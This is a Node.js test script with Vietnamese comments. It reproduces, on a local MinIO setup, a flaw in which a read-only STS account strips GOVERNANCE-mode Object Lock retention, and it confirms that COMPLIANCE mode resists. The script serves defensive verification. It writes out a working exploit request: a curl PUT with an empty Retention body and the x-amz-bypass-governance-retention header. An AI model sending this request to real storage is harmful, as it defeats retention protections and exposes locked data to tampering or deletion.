// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Làng Nghề Số contributors
// Kiểm tra THẬT lỗ hổng gỡ khóa Object Lock của bản MinIO đang dùng, ở CẢ HAI chế độ, khi đi THẲNG vào MinIO (không qua cổng gác):
// một tài khoản STS chỉ-xem gửi PutObjectRetention rỗng kèm tiêu đề x-amz-bypass-governance-retention: true.
//  - GOVERNANCE: lỗ hổng tái hiện được (hạn khóa bị gỡ) => đây là lý do COMPLIANCE là khuyến nghị cho triển khai thật;
//  - COMPLIANCE: hạn khóa phải còn nguyên.
// Dùng bucket thử riêng 'lock-probe-<mã>'. Đối tượng COMPLIANCE KHÔNG hoàn tác được (giữ 1 ngày, không ai xóa được, kể cả root);
// bucket thử và đối tượng đó còn lại trong kho tới khi hết hạn: nhỏ và vô hại. Đối tượng GOVERNANCE được dọn bằng đặc quyền bypass.
// Chạy: node scripts/check-minio-lock-modes.js [--yes]   (cần --yes vì tạo một đối tượng không hoàn tác trong 1 ngày)
const fs = require("fs");
const http = require("http");
const crypto = require("crypto");
const { execFileSync } = require("child_process");
const env = Object.fromEntries(fs.readFileSync(".env", "utf8").split(/\r?\n/).map((l) => l.match(/^([A-Za-z_]\w*)=(.*)$/)).filter(Boolean).map((m) => [m[1], m[2]]));
if (!process.argv.includes("--yes")) {
  console.log("Bài thử tạo một đối tượng COMPLIANCE giữ 1 ngày: KHÔNG hoàn tác (không xóa được trước khi hết hạn, kể cả root). Thêm --yes để xác nhận.");
  process.exit(1);
}
const PORT = Number(env.APISIX_GATEWAY_PORT ?? 9080);
const KC = `http://localhost:8080/realms/${env.KEYCLOAK_REALM ?? "dxos"}/protocol/openid-connect/token`;
const TS = Date.now();
const BUCKET = `lock-probe-${TS}`;
const NET = execFileSync("docker", ["inspect", "dxos-minio", "--format", "{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}"], { encoding: "utf8" }).trim();
let fail = 0;
const ok = (cond, msg) => {
  console.log(`${cond ? "PASS" : "FAIL"}  ${msg}`);
  if (!cond) fail++;
};
const dk = (...a) => execFileSync("docker", a, { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], env: { ...process.env, MSYS_NO_PATHCONV: "1" } }).trim();
const root = (script) => dk("exec", "-e", `MC_HOST_x=http://${env.MINIO_ROOT_USER}:${env.MINIO_ROOT_PASSWORD}@localhost:9000`, "dxos-minio", "sh", "-c", script);

const token = async (user) => {
  const r = await fetch(KC, { method: "POST", body: new URLSearchParams({ grant_type: "password", client_id: env.KEYCLOAK_CLIENT_ID, client_secret: env.KEYCLOAK_CLIENT_SECRET, username: user, password: user }) });
  return (await r.json()).access_token;
};
const sts = (jwt) =>
  new Promise((resolve, reject) => {
    const path = `/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&DurationSeconds=900&WebIdentityToken=${encodeURIComponent(jwt)}`;
    const rq = http.request({ host: "localhost", port: PORT, path, method: "POST", headers: { host: `s3.localhost:${PORT}` } }, (res) => {
      let b = "";
      res.on("data", (d) => (b += d));
      res.on("end", () => {
        const g = (t) => new RegExp(`<${t}>([^<]*)</${t}>`).exec(b)?.[1];
        g("AccessKeyId") ? resolve({ ak: g("AccessKeyId"), sk: g("SecretAccessKey"), st: g("SessionToken") }) : reject(new Error(`STS thất bại: ${b.slice(0, 160)}`));
      });
    });
    rq.on("error", reject);
    rq.end();
  });
const RET = '<Retention xmlns="http://s3.amazonaws.com/doc/2006-03-01/"></Retention>';
const MD5 = crypto.createHash("md5").update(RET).digest("base64");
// gửi yêu cầu khai thác THẲNG tới MinIO (trong mạng Docker) bằng curl của một container tạm
const unlock = (c, key) =>
  dk("run", "--rm", "--network", NET, "curlimages/curl", "-s", "-w", "%{http_code}", "-X", "PUT", "--aws-sigv4", "aws:amz:us-east-1:s3", "--user", `${c.ak}:${c.sk}`,
    "-H", `x-amz-security-token: ${c.st}`, "-H", "x-amz-bypass-governance-retention: true", "-H", `Content-MD5: ${MD5}`, "--data", RET, `http://minio:9000/${BUCKET}/${key}?retention`).slice(-3);
const retentionOf = (key) => root(`mc retention info x/${BUCKET}/${key} 2>&1 || true`);

(async () => {
  const viewer = await sts(await token("viewer"));
  root(`mc mb --with-lock x/${BUCKET} && printf 'thu-governance' > /tmp/g.txt && printf 'thu-compliance' > /tmp/c.txt`);
  root(`mc cp /tmp/g.txt x/${BUCKET}/gov.txt >/dev/null && mc retention set GOVERNANCE 1d x/${BUCKET}/gov.txt >/dev/null`);
  root(`mc cp /tmp/c.txt x/${BUCKET}/comp.txt >/dev/null && mc retention set COMPLIANCE 1d x/${BUCKET}/comp.txt >/dev/null`);
  ok(/GOVERNANCE/.test(retentionOf("gov.txt")), "đối tượng GOVERNANCE có hạn khóa");
  ok(/COMPLIANCE/.test(retentionOf("comp.txt")), "đối tượng COMPLIANCE có hạn khóa");

  const codeGov = unlock(viewer, "gov.txt");
  const govAfter = retentionOf("gov.txt");
  ok(codeGov === "200" && !/GOVERNANCE/.test(govAfter), `GOVERNANCE: tài khoản chỉ-xem GỠ ĐƯỢC hạn khóa khi đi thẳng vào MinIO (HTTP ${codeGov}): lỗ hổng tái hiện được`);

  const codeComp = unlock(viewer, "comp.txt");
  const compAfter = retentionOf("comp.txt");
  ok(codeComp !== "200" && /COMPLIANCE/.test(compAfter), `COMPLIANCE: hạn khóa còn nguyên, yêu cầu khai thác bị từ chối (HTTP ${codeComp})`);

  // dọn đối tượng GOVERNANCE (đã mất khóa) bằng quyền root; đối tượng COMPLIANCE không dọn được
  try {
    root(`mc rm --versions --force --bypass x/${BUCKET}/gov.txt >/dev/null`);
  } catch {
    /* không quan trọng */
  }
  console.log(`(bucket thử ${BUCKET} còn lại cùng đối tượng COMPLIANCE tới khi hết hạn 1 ngày)`);
  console.log(fail ? `\n${fail} KIỂM TRA THẤT BẠI` : "\nTẤT CẢ ĐẠT");
  process.exit(fail ? 1 : 0);
})().catch((e) => {
  console.error("Lỗi:", e.message);
  process.exit(2);
});
